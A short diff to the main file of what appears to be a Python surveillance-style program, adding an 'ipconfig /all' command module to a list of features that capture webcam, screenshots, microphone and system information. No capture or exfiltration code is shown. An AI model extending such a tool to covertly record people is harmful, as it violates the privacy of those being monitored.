@@ -1,7 +1,7 @@
 import threading
 
 import Features.feature
-from Features.feature import WEBCAMERA, SCREENSHOTS, MICROPHONE, SYS_INFO
+from Features.feature import WEBCAMERA, SCREENSHOTS, MICROPHONE, SYS_INFO, CMD_PROMPTS
 
 
 class MainFileException(Exception):
@@ -27,7 +27,7 @@ def main():
         SCREENSHOTS.screenshots,
         MICROPHONE.microphone,
         SYS_INFO.system_information,
-        SYS_INFO.os_version
+        CMD_PROMPTS.ipconfig_all
     ]
 
     try:
